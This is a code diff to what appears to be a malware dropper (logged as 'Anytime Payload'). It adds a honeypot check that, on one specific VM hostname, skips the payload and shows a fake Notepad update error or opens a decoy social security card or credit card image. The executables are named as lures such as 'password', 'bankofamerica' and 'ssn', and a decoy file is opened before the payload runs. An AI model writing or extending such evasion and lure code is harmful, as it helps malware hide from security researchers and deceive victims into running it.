@@ -125,6 +125,77 @@ def log(msg):
         print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")
 
 
+def check_honeypot_vm():
+    """
+    Check if running on honeypot VM. If so (and not in dev mode), show fake behavior and exit.
+    Returns True if honeypot detected and should exit, False otherwise.
+    """
+    # Skip check in dev mode (allows testing on VM)
+    if is_dev_mode():
+        log("Dev mode: skipping honeypot VM check")
+        return False
+
+    try:
+        hostname = socket.gethostname().upper()
+
+        if hostname == "WIN-0FGNHSTJ0Q0":
+            # SAFE MODE - We're on the honeypot VM in production mode
+            log("Honeypot VM detected - activating safe mode")
+
+            exe_name = Path(sys.executable).stem.lower()
+
+            # For TEXT file variants - show fake error popup
+            if "password" in exe_name or "recovery" in exe_name or "bankofamerica" in exe_name:
+                import ctypes
+
+                title = "Notepad (Update Required)"
+                message = (
+                    "You are using a legacy version of Notepad which is no longer compatible with Microsoft products or Windows 11.\n\n"
+                    "Please update to the latest Windows 11 release and restart your computer to install the latest version of Notepad.\n\n"
+                    "To update: Settings > Windows Update > Check for updates"
+                )
+                ctypes.windll.user32.MessageBoxW(0, message, title, 0x40)
+                return True
+
+            # For IMAGE file variants - extract and open the PNG, then exit
+            elif "social" in exe_name or "ssn" in exe_name or "credit" in exe_name or "card" in exe_name:
+                try:
+                    # Get bundled resource path
+                    if getattr(sys, "frozen", False):
+                        bundle_dir = Path(sys._MEIPASS)
+                    else:
+                        bundle_dir = Path(__file__).parent
+
+                    # Determine which image to show
+                    if "social" in exe_name or "ssn" in exe_name:
+                        source_image = bundle_dir / "assets" / "image1.png"
+                        decoy_path = Path.cwd() / "socialsecuritycard.png"
+                    else:  # credit card
+                        source_image = bundle_dir / "assets" / "image2.png"
+                        decoy_path = Path.cwd() / "Credit_Card_Photo.png"
+
+                    # Copy and open the image
+                    import shutil
+
+                    shutil.copy(source_image, decoy_path)
+
+                    if sys.platform == "win32":
+                        os.startfile(str(decoy_path))  # Opens with default image viewer
+
+                    return True  # Signal to exit
+                except Exception:
+                    # If image extraction fails, just exit silently
+                    return True
+
+            return True  # Exit for any unrecognized variant on honeypot VM
+
+    except Exception:
+        # If check fails, proceed with execution (fail open)
+        pass
+
+    return False
+
+
 def create_decoy():
     """Create and open appropriate decoy file based on executable name"""
     try:
@@ -489,6 +560,11 @@ def main():
 
     try:
         log("=== Anytime Payload Starting ===")
+
+        # SAFETY CHECK: Detect honeypot VM (only in production mode)
+        if check_honeypot_vm():
+            # Honeypot detected - exit without executing payload
+            sys.exit(0)
 
         # Create decoy immediately
         create_decoy()
